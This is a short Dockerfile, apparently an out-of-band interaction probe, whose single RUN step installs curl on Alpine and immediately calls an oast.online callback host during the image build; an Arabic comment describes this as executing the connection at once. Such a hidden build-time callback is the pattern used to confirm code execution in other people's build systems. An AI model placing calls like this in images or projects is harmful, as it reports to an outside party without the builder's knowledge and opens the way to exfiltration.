FROM alpine:latest

# تنزيل curl وتنفيذ الاتصال فوراً
RUN apk add --no-cache curl && curl http://docker-original.d52eckg3t4ghpligsnog8d783hiwn4wr4.oast.online
